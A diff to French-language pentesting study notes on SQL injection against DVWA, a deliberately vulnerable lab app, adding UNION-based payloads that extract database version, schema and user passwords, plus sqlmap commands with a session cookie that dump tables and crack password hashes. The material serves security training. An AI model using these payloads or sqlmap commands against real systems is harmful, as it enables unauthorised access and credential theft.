@@ -158,7 +158,7 @@
         ' OR 1=1 #
         1' OR '1'='1'# (pour obtenir tout les records dans la table)
        
-        Si le #, 99% de chance que le DBMS soit MySQL
+        Si le #, 99% de chance que le DBMS soit MySQL ou un fork (mariadb etc)
         Si# ok:
         %' or 0=0 union select null, version() # ( connaitre la version de database) ou 1' OR 1=1 UNION SELECT 1, VERSION()#
         1' OR 1=1 UNION SELECT 1,DATABASE() # (connaitre le nom de la DB)
@@ -167,26 +167,34 @@
             1' ORDER BY 2 # etc jusqu'a avoir l'erreur
             Si erreur à 3 = 2champs
             Si erreur à 4 = 3champs etc
+        1' OR 1=1 UNION SELECT 1, VERSION()#
+        1' OR 1=1 UNION SELECT 1, DATABASE()#
+        1' OR 1=1 UNION SELECT  1, table_name FROM information_schema.tables #
+        1' OR 1=1 UNION SELECT  1, column_name FROM information_schema.columns  #
+        1' OR 1=1 UNION SELECT user, password FROM users(nom de la table) #
         
         SQLMAP
         sqlmap -u "http://192.168.46.141/DVWA-master/vulnerabilities/sqli/?id=3&Submit=Submit#" --cookie="PHPSESSID=2t7bspc6qpiu7c1ls66pp0fr34; security=low" --dbs --banner --current-user --current-db --passwords --users
-          --dbs pour extraire le nom des tables
-          --banner extrait la version de la db
-          --current-user extrait le user connecté au SGBD
-          --current-db la database actuellement utilisée
-          --passwords obtient les mdp de la db
-          --users affiche les utilisateurs de la db
+          •	L’argument --dbs pour énumérer le nom des bases de données
+          •	L’argument --banner pour afficher la version de base de données
+          •	L’argument --current-user pour afficher l’utilisateur connecté au système de gestion de base de données
+          •	L’argument --current-db pour afficher la base de données de gestion du système de gestion de base de données
+          •	L’argument --users pour afficher le ou les utilisateurs connectés au système de gestion de base de données
+          •	L’argument --passwords pour obtenir les hash du mot de passe du ou des utilisateurs connectés au système de gestion de base de données. Cet argument va également essayer de cracker le has des mots de passe.
+
 
         sqlmap -u "http://192.168.46.141/DVWA-master/vulnerabilities/sqli/?id=3&Submit=Submit#" --cookie="PHPSESSID=2t7bspc6qpiu7c1ls66pp0fr34; security=low" --tables -D dvwa
-          -D dvwa pour selectionner la base de données
-          --tables pour afficher les tables dans cette base
+          •	L’argument -D dvwa pour sélectionner la base de données dvwa
+          •	L’argument --tables pour afficher les tables dans cette base
+
 
         sqlmap -u "http://192.168.46.141/DVWA-master/vulnerabilities/sqli/?id=3&Submit=Submit#" --cookie="PHPSESSID=2t7bspc6qpiu7c1ls66pp0fr34; security=low" -p id -T users --batch --threads 5 –dump
-          -p correspond au parameter id que l’on va enumerer
-          -T dans la table users
-          --batch en mode non interactive
-          -threads 5 nombre de threads
-          --dump pour dumper le contenu de la table
+          •	L’argument -p pour sélectionner le paramètre testable
+          •	L’argument -T pour sélectionner la table
+          •	L’argument --batch pour éviter de devoir répondre aux questions avec y ou n
+          •	L’argument -threads pour limiter le nombre de requêtes http simultanées à 5
+          •	L’argument --dump pour afficher les entrées de la table
+
 
         https://github.com/sqlmapproject/sqlmap/wiki/Usage (MEILLEUR DES CHEATSHEET)
         https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap CHEATSHEET EXPLICATIVE !!!
